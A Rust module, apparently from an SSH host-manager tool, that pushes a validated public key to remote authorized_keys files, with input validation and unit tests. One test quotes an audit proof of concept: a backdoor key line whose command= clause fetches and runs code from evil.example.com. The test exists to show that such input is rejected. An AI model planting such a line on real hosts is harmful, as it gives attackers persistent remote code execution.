//! Push a public key onto a remote host's `~/.ssh/authorized_keys`.
//!
//! Equivalent of `ssh-copy-id` without the dependency: spawns a single
//! ssh invocation per host, pipes the public key over stdin, and runs an
//! idempotent shell snippet on the remote that creates `~/.ssh` if
//! missing and appends the key only when it is not already present.
//!
//! The remote snippet never sees the pubkey via the shell command line
//! (which would require fragile escaping). Stdin is the canonical channel
//! for binary-ish content over SSH.

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};

use log::debug;

/// Outcome for one host in a push run. The renderer summarises these
/// into a toast (when every entry is `Appended` / `AlreadyPresent`) or a
/// sticky error block (when at least one is `Failed`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum KeyPushOutcome {
    /// Pubkey was newly appended to the remote `authorized_keys`.
    Appended,
    /// Pubkey was already present in `authorized_keys`; nothing changed.
    AlreadyPresent,
    /// Push failed. Carries a scrubbed stderr excerpt (control chars
    /// stripped, length-capped) so the user sees what went wrong without
    /// leaking the full ssh-vvv firehose into the UI.
    Failed(String),
}

/// One row in the in-flight push result list. Populated as worker
/// threads complete and surfaced to the UI via `AppEvent::KeyPushResult`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct KeyPushResult {
    pub alias: String,
    pub outcome: KeyPushOutcome,
}

/// Maximum stderr length retained in `KeyPushOutcome::Failed`. Longer
/// `ssh -v` output is truncated with an ellipsis so a single failure
/// cannot blow out the sticky error overlay.
const STDERR_BUDGET: usize = 200;

/// Marker prefix written by the remote snippet on the final line of
/// stdout. The prefix is unique enough that no realistic `.profile` or
/// motd will collide. `classify_stdout` matches against this prefix so a
/// shared-account host whose login banner echoes the word "APPENDED"
/// cannot trick us into reporting success.
const MARKER_APPENDED: &str = "__PURPLE_KEY_PUSH:APPENDED__";
const MARKER_ALREADY_PRESENT: &str = "__PURPLE_KEY_PUSH:ALREADY_PRESENT__";
const MARKER_APPEND_FAILED: &str = "__PURPLE_KEY_PUSH:APPEND_FAILED__";

/// Remote shell snippet that idempotently appends the pubkey to
/// `~/.ssh/authorized_keys`. The pubkey arrives on stdin via `$(cat)` so
/// no shell quoting of the key content is needed locally.
///
/// Permission policy: `~/.ssh` is chmod 700 only when we just created
/// it (so a deliberately group-readable directory managed by Ansible or
/// similar is left alone), and `authorized_keys` is chmod 600 only when
/// the file is fresh. Both invariants are enforced via short-circuit:
/// the absence test runs before the create, and the chmod runs only on
/// the create branch. sshd's StrictModes requires the dir to be 700, so
/// a wide-open dir we created is tightened immediately.
///
/// CRLF defence: $PUBKEY is normalised with `tr -d '\r'` before both the
/// dedup match and the append, so a CRLF-terminated source file cannot
/// produce a fresh duplicate per push. The file side already strips CR
/// before matching so authorized_keys files edited with Windows tooling
/// dedup correctly too.
///
/// The append uses `|| { ... exit 1; }` so a failed write (ENOSPC,
/// read-only mount) emits APPEND_FAILED instead of silently claiming
/// success on the redirect's exit code.
///
/// Output contract (always the last non-empty line of stdout):
/// - `__PURPLE_KEY_PUSH:APPENDED__`        - key was newly written
/// - `__PURPLE_KEY_PUSH:ALREADY_PRESENT__` - key was already in file
/// - `__PURPLE_KEY_PUSH:APPEND_FAILED__`   - append redirect failed
/// - anything else                          - classified as Failed
const REMOTE_SNIPPET: &str = r#"umask 077
if [ ! -d ~/.ssh ]; then
  mkdir -p ~/.ssh
  chmod 700 ~/.ssh
fi
if [ ! -f ~/.ssh/authorized_keys ]; then
  touch ~/.ssh/authorized_keys
  chmod 600 ~/.ssh/authorized_keys
fi
PUBKEY=$(cat | tr -d '\r')
if tr -d '\r' < ~/.ssh/authorized_keys 2>/dev/null | grep -qxF -- "$PUBKEY"; then
  echo __PURPLE_KEY_PUSH:ALREADY_PRESENT__
  exit 0
fi
printf '%s\n' "$PUBKEY" >> ~/.ssh/authorized_keys || { echo __PURPLE_KEY_PUSH:APPEND_FAILED__; exit 1; }
echo __PURPLE_KEY_PUSH:APPENDED__
"#;

/// Parse the remote snippet's stdout into an outcome. Pure helper so the
/// worker and tests share the same classification. Match is against the
/// last non-empty line (stripped of trailing CR) so motd or login-banner
/// output before the marker is tolerated.
pub fn classify_stdout(stdout: &str) -> Option<KeyPushOutcome> {
    let trimmed = stdout.trim();
    let last = trimmed
        .lines()
        .map(|l| l.trim_end_matches('\r').trim())
        .rfind(|l| !l.is_empty())?;
    match last {
        MARKER_APPENDED => Some(KeyPushOutcome::Appended),
        MARKER_ALREADY_PRESENT => Some(KeyPushOutcome::AlreadyPresent),
        MARKER_APPEND_FAILED => Some(KeyPushOutcome::Failed(
            "remote append failed (disk full, read-only mount?)".to_string(),
        )),
        _ => None,
    }
}

/// Scrub stderr for display in the UI. Drops ANSI escapes, control bytes,
/// then caps at `STDERR_BUDGET` chars with an ellipsis. Joins multiple
/// lines with a single space so the error sticky overlay can render the
/// scrubbed text on one row.
fn scrub_stderr(raw: &str) -> String {
    let cleaned: String = raw
        .chars()
        .filter(|c| !c.is_control() || *c == '\n')
        .collect();
    let joined = cleaned
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .collect::<Vec<_>>()
        .join(" ");
    if joined.chars().count() > STDERR_BUDGET {
        joined.chars().take(STDERR_BUDGET).collect::<String>() + "..."
    } else {
        joined
    }
}

/// Push `pubkey` to the remote `alias` over SSH. Synchronous: spawns
/// `ssh -F <config_path> -T -o ConnectTimeout=10 -- <alias> <REMOTE_SNIPPET>`,
/// pipes `pubkey` to stdin, waits for the child to finish, and returns
/// the parsed outcome. The cancel flag is observed before the spawn so a
/// rapid Esc after launching the batch can short-circuit pending hosts.
pub fn push_to_host(
    pubkey: &str,
    alias: &str,
    config_path: &Path,
    cancel: &Arc<AtomicBool>,
) -> KeyPushOutcome {
    if cancel.load(Ordering::Relaxed) {
        return KeyPushOutcome::Failed("cancelled".to_string());
    }

    let mut cmd = Command::new("ssh");
    cmd.arg("-F")
        .arg(config_path)
        .arg("-T")
        .arg("-o")
        .arg("ConnectTimeout=10")
        // ServerAliveInterval/CountMax bound the post-auth phase:
        // ConnectTimeout only covers the TCP/handshake. Without these,
        // a remote NFS-stalled `~/.ssh/authorized_keys` or a hung shell
        // could block `wait_with_output` indefinitely. 10s × 3 = 30s
        // worst case after auth before SSH tears down the session.
        .arg("-o")
        .arg("ServerAliveInterval=10")
        .arg("-o")
        .arg("ServerAliveCountMax=3")
        .arg("-o")
        .arg("ControlMaster=no")
        .arg("-o")
        .arg("ControlPath=none")
        .arg("--")
        .arg(alias)
        .arg(REMOTE_SNIPPET)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            debug!("[purple] key_push: spawn failed alias={} err={}", alias, e);
            return KeyPushOutcome::Failed(format!("spawn ssh: {}", e));
        }
    };

    // Pipe the pubkey with a trailing newline so `printf '%s\n' "$PUBKEY"`
    // on the remote produces an exact `authorized_keys` line.
    if let Some(stdin) = child.stdin.as_mut() {
        let payload = if pubkey.ends_with('\n') {
            pubkey.to_string()
        } else {
            format!("{}\n", pubkey)
        };
        if let Err(e) = stdin.write_all(payload.as_bytes()) {
            debug!(
                "[purple] key_push: stdin write failed alias={} err={}",
                alias, e
            );
            let _ = child.kill();
            let _ = child.wait();
            return KeyPushOutcome::Failed(format!("write pubkey: {}", e));
        }
    }
    // Drop stdin so the remote `cat` receives EOF.
    drop(child.stdin.take());

    let output = match child.wait_with_output() {
        Ok(o) => o,
        Err(e) => {
            debug!("[purple] key_push: wait failed alias={} err={}", alias, e);
            return KeyPushOutcome::Failed(format!("wait ssh: {}", e));
        }
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    if !output.status.success() {
        let scrubbed = scrub_stderr(&stderr);
        let msg = if scrubbed.is_empty() {
            format!("ssh exited {}", output.status)
        } else {
            scrubbed
        };
        debug!(
            "[purple] key_push: failed alias={} status={} stderr={}",
            alias, output.status, msg
        );
        return KeyPushOutcome::Failed(msg);
    }

    match classify_stdout(&stdout) {
        Some(outcome) => {
            debug!("[purple] key_push: alias={} outcome={:?}", alias, outcome);
            outcome
        }
        None => {
            let preview = scrub_stderr(&stdout);
            KeyPushOutcome::Failed(format!(
                "unexpected snippet output: {}",
                if preview.is_empty() {
                    "(empty)"
                } else {
                    &preview
                }
            ))
        }
    }
}

/// Maximum size of a `.pub` file we will accept. OpenSSH's RSA-8192 keys
/// serialise to ~3 KiB; we cap at 16 KiB to leave headroom for comments
/// and reject pathological inputs (symlinks to logs, /dev/urandom).
pub const PUBKEY_MAX_BYTES: u64 = 16 * 1024;

/// Public-key type tokens we will push. Limited to the OpenSSH algorithms
/// that produce valid `authorized_keys` entries. Cert tokens (e.g.
/// `ssh-ed25519-cert-v01@openssh.com`) are intentionally excluded: pushing
/// a certificate as a static key bypasses its TTL.
const ALLOWED_KEY_TYPES: &[&str] = &[
    "ssh-rsa",
    "ssh-ed25519",
    "ssh-dss",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ssh-ed25519@openssh.com",
    "sk-ecdsa-sha2-nistp256@openssh.com",
];

/// Validation outcome for a public-key file's contents.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PubkeyValidationError {
    Empty,
    MultiLine,
    UnsupportedType(String),
    MalformedBase64,
    TooLarge(u64),
    NotARegularFile,
}

/// Parse and validate a `.pub` file's contents into a single canonical
/// `authorized_keys` line. Rejects multi-line input (which would silently
/// install several keys, including embedded `command=` clauses), unknown
/// algorithms, and unparseable base64 bodies. The returned string is
/// trimmed of trailing whitespace / CR so the remote `grep -qxF` dedup
/// step matches byte-for-byte across pushes.
pub fn validate_pubkey(raw: &str) -> Result<String, PubkeyValidationError> {
    let trimmed = raw.trim_end_matches(['\n', '\r', ' ', '\t']);
    if trimmed.is_empty() {
        return Err(PubkeyValidationError::Empty);
    }
    if trimmed.lines().count() != 1 {
        return Err(PubkeyValidationError::MultiLine);
    }
    let mut parts = trimmed.splitn(3, ' ');
    let typ = parts.next().unwrap_or("");
    let blob = parts.next().unwrap_or("");
    if !ALLOWED_KEY_TYPES.contains(&typ) {
        return Err(PubkeyValidationError::UnsupportedType(typ.to_string()));
    }
    if blob.is_empty() {
        return Err(PubkeyValidationError::MalformedBase64);
    }
    use base64::Engine;
    if base64::engine::general_purpose::STANDARD
        .decode(blob.as_bytes())
        .is_err()
    {
        return Err(PubkeyValidationError::MalformedBase64);
    }
    Ok(trimmed.to_string())
}

/// Read a `.pub` file with a hard byte cap and reject anything that is
/// not a regular file. On Unix the open uses `O_NOFOLLOW` so a symlink at
/// the .pub path errors out instead of silently dereferencing into a log
/// file or `/dev/urandom`.
pub fn read_pubkey_file(path: &Path) -> Result<String, PubkeyValidationError> {
    use std::io::Read;
    let mut opts = std::fs::OpenOptions::new();
    opts.read(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.custom_flags(libc::O_NOFOLLOW);
    }
    let f = opts
        .open(path)
        .map_err(|_| PubkeyValidationError::NotARegularFile)?;
    let meta = f
        .metadata()
        .map_err(|_| PubkeyValidationError::NotARegularFile)?;
    if !meta.file_type().is_file() {
        return Err(PubkeyValidationError::NotARegularFile);
    }
    if meta.len() > PUBKEY_MAX_BYTES {
        return Err(PubkeyValidationError::TooLarge(meta.len()));
    }
    let mut buf = String::new();
    f.take(PUBKEY_MAX_BYTES)
        .read_to_string(&mut buf)
        .map_err(|_| PubkeyValidationError::NotARegularFile)?;
    Ok(buf)
}

/// Resolve the local public-key path for a key whose `display_path` is
/// `~/.ssh/id_ed25519`. Expands the tilde and appends `.pub`. The caller
/// is expected to validate the file exists before reading.
pub fn pubkey_path_for(paths: Option<&crate::runtime::env::Paths>, display_path: &str) -> PathBuf {
    let with_pub = format!("{}.pub", display_path);
    if let Some(rest) = with_pub.strip_prefix("~/")
        && let Some(p) = paths
    {
        return p.home().join(rest);
    }
    PathBuf::from(with_pub)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_stdout_appended() {
        assert_eq!(
            classify_stdout("__PURPLE_KEY_PUSH:APPENDED__\n"),
            Some(KeyPushOutcome::Appended)
        );
    }

    #[test]
    fn classify_stdout_already_present() {
        assert_eq!(
            classify_stdout("__PURPLE_KEY_PUSH:ALREADY_PRESENT__\n"),
            Some(KeyPushOutcome::AlreadyPresent)
        );
    }

    #[test]
    fn classify_stdout_append_failed() {
        match classify_stdout("__PURPLE_KEY_PUSH:APPEND_FAILED__\n") {
            Some(KeyPushOutcome::Failed(_)) => {}
            other => panic!("expected Failed, got {:?}", other),
        }
    }

    #[test]
    fn classify_stdout_motd_then_marker() {
        // SSH-of-the-day banners or `.profile` output may print before
        // our marker. Last non-empty line still wins.
        let stdout = "Welcome to Ubuntu 22.04\nLast login: ...\n__PURPLE_KEY_PUSH:APPENDED__\n";
        assert_eq!(classify_stdout(stdout), Some(KeyPushOutcome::Appended));
    }

    #[test]
    fn classify_stdout_motd_word_collision_does_not_match() {
        // Adversarial: a banner that contains the bare word "APPENDED"
        // must NOT be classified as success. The namespaced marker
        // prevents collision.
        let stdout = "Welcome. APPENDED was a great patch.\nhave a good day\n";
        assert_eq!(classify_stdout(stdout), None);
    }

    #[test]
    fn classify_stdout_crlf_line_endings() {
        // Some shells emit CRLF over SSH ptys. The classifier strips the
        // trailing CR so the marker still matches.
        let stdout = "Welcome\r\n__PURPLE_KEY_PUSH:APPENDED__\r\n";
        assert_eq!(classify_stdout(stdout), Some(KeyPushOutcome::Appended));
    }

    #[test]
    fn classify_stdout_unknown_returns_none() {
        assert_eq!(classify_stdout("hello\nworld\n"), None);
    }

    #[test]
    fn classify_stdout_empty_returns_none() {
        assert_eq!(classify_stdout(""), None);
        assert_eq!(classify_stdout("\n\n"), None);
    }

    #[test]
    fn scrub_stderr_drops_control_bytes() {
        // ANSI-stripped: ESC[31mError\x1b[0m
        let raw = "\x1b[31mError: connection refused\x1b[0m\n";
        let scrubbed = scrub_stderr(raw);
        assert!(!scrubbed.contains('\x1b'));
        assert!(scrubbed.contains("Error"));
    }

    #[test]
    fn scrub_stderr_joins_lines() {
        let raw = "line1\nline2\nline3\n";
        assert_eq!(scrub_stderr(raw), "line1 line2 line3");
    }

    #[test]
    fn scrub_stderr_truncates_long_input() {
        let raw = "x".repeat(STDERR_BUDGET * 2);
        let scrubbed = scrub_stderr(&raw);
        assert!(scrubbed.ends_with("..."));
        assert!(scrubbed.chars().count() <= STDERR_BUDGET + 3);
    }

    #[test]
    fn scrub_stderr_empty_input() {
        assert_eq!(scrub_stderr(""), "");
        assert_eq!(scrub_stderr("   \n\n  \n"), "");
    }

    #[test]
    fn pubkey_path_appends_pub_suffix() {
        let p = pubkey_path_for(None, "/tmp/id_ed25519");
        assert_eq!(p.to_string_lossy(), "/tmp/id_ed25519.pub");
    }

    #[test]
    fn pubkey_path_expands_tilde() {
        let paths = crate::runtime::env::Paths::new("/home/u");
        let p = pubkey_path_for(Some(&paths), "~/.ssh/id_ed25519");
        assert!(!p.to_string_lossy().starts_with('~'));
        assert!(p.to_string_lossy().ends_with(".ssh/id_ed25519.pub"));
    }

    #[test]
    fn push_to_host_short_circuits_when_cancel_is_set() {
        // Cancel before spawn must return Failed("cancelled") without
        // touching ssh. We point at a path that does not exist on disk
        // so a buggy implementation that DID try to spawn would fail
        // loudly instead of silently succeeding.
        let cancel = Arc::new(AtomicBool::new(true));
        let outcome = push_to_host(
            "ssh-ed25519 AAAA test@host",
            "this-alias-does-not-exist",
            std::path::Path::new("/tmp/purple-nonexistent-config"),
            &cancel,
        );
        match outcome {
            KeyPushOutcome::Failed(msg) => {
                assert!(
                    msg.contains("cancel"),
                    "expected cancel message, got: {}",
                    msg
                );
            }
            other => panic!("expected Failed(cancelled), got {:?}", other),
        }
    }

    #[test]
    fn validate_pubkey_accepts_ed25519() {
        let line = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb1 ops@bastion";
        assert_eq!(validate_pubkey(line).unwrap(), line);
    }

    #[test]
    fn validate_pubkey_strips_trailing_whitespace() {
        let raw = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb1 ops@bastion\n\r\n";
        let cleaned = validate_pubkey(raw).unwrap();
        assert!(!cleaned.ends_with('\n'));
        assert!(!cleaned.ends_with('\r'));
    }

    #[test]
    fn validate_pubkey_rejects_empty() {
        assert_eq!(validate_pubkey(""), Err(PubkeyValidationError::Empty));
        assert_eq!(
            validate_pubkey("   \n\n"),
            Err(PubkeyValidationError::Empty)
        );
    }

    #[test]
    fn validate_pubkey_rejects_multi_line_command_injection() {
        // The exact PoC from the security audit: two valid lines, the
        // second wears a `command=` clause. Multi-line is the canonical
        // shape that grep-qxF can never dedup, so we reject upstream.
        let raw = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb1 real@host\ncommand=\"curl evil.example.com|sh\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBnSCk/2pwG7QHQHIvF2UxYZsMP1qJ4XbJjT7mxBSBb2 backdoor@host";
        assert_eq!(validate_pubkey(raw), Err(PubkeyValidationError::MultiLine));
    }

    #[test]
    fn validate_pubkey_rejects_unknown_type() {
        let raw = "ssh-ed25519-cert-v01@openssh.com AAAA cert@host";
        match validate_pubkey(raw) {
            Err(PubkeyValidationError::UnsupportedType(t)) => {
                assert_eq!(t, "ssh-ed25519-cert-v01@openssh.com");
            }
            other => panic!("expected UnsupportedType, got {:?}", other),
        }
    }

    #[test]
    fn validate_pubkey_rejects_bogus_base64() {
        let raw = "ssh-ed25519 not!valid!base64!?? comment";
        assert_eq!(
            validate_pubkey(raw),
            Err(PubkeyValidationError::MalformedBase64)
        );
    }

    #[test]
    fn validate_pubkey_rejects_empty_blob() {
        let raw = "ssh-ed25519  comment";
        assert_eq!(
            validate_pubkey(raw),
            Err(PubkeyValidationError::MalformedBase64)
        );
    }

    #[test]
    fn read_pubkey_file_rejects_oversize() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("huge.pub");
        let body = "x".repeat((PUBKEY_MAX_BYTES + 1) as usize);
        std::fs::write(&path, body).unwrap();
        match read_pubkey_file(&path) {
            Err(PubkeyValidationError::TooLarge(n)) => {
                assert!(n > PUBKEY_MAX_BYTES);
            }
            other => panic!("expected TooLarge, got {:?}", other),
        }
    }

    #[cfg(unix)]
    #[test]
    fn read_pubkey_file_rejects_symlink() {
        let dir = tempfile::tempdir().expect("tempdir");
        let target = dir.path().join("real.pub");
        std::fs::write(&target, "ssh-ed25519 AAAA test@host").unwrap();
        let link = dir.path().join("link.pub");
        std::os::unix::fs::symlink(&target, &link).unwrap();
        assert!(matches!(
            read_pubkey_file(&link),
            Err(PubkeyValidationError::NotARegularFile)
        ));
    }

    #[test]
    fn remote_snippet_has_expected_markers() {
        // Regression guard: the worker parses these three markers; if the
        // snippet ever changes its echoes the parser would silently break.
        assert!(REMOTE_SNIPPET.contains(MARKER_APPENDED));
        assert!(REMOTE_SNIPPET.contains(MARKER_ALREADY_PRESENT));
        assert!(REMOTE_SNIPPET.contains(MARKER_APPEND_FAILED));
        assert!(REMOTE_SNIPPET.contains("grep -qxF"));
        // CRLF guard is in the snippet too; if a future edit drops the
        // tr step, CRLF-terminated authorized_keys files would double-append.
        assert!(REMOTE_SNIPPET.contains("tr -d '\\r'"));
    }
}
